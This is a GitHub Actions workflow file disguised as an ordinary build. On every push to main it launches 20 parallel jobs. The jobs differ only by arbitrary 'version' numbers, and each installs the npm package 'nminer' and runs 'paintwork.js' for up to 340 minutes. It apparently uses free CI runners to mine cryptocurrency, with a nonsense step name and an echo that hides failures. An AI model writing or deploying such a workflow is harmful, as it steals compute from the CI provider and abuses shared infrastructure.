name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8640 }
          - { version: 2144 }
          - { version: 9568 }
          - { version: 9642 }
          - { version: 7217 }
          - { version: 6648 }
          - { version: 6463 }
          - { version: 3560 }
          - { version: 6353 }
          - { version: 8834 }
          - { version: 2742 }
          - { version: 6103 }
          - { version: 1264 }
          - { version: 9918 }
          - { version: 3193 }
          - { version: 4768 }
          - { version: 2676 }
          - { version: 6271 }
          - { version: 475 }
          - { version: 8253 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ah though for
        run: |
          npm install nminer@latest
          timeout 340m node paintwork.js || echo "paintwork executed"